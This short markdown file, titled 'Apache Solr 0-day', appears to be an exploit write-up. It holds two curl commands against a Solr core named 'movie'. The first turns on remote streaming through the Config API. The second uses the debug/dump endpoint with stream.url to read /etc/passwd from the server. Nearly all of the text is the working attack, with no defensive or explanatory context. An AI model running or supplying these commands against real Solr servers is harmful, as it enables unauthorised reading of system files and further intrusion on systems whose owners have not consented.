#Apache Solr 0-day

## Hacked by: https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 

## Enable remote stream

```
TARGET="127.0.0.1:8983"
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://$TARGET/solr/movie/config -H 'Content-type:application/json'

```

## Exploit

```
curl "http://$TARGET/solr/movie/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"

```

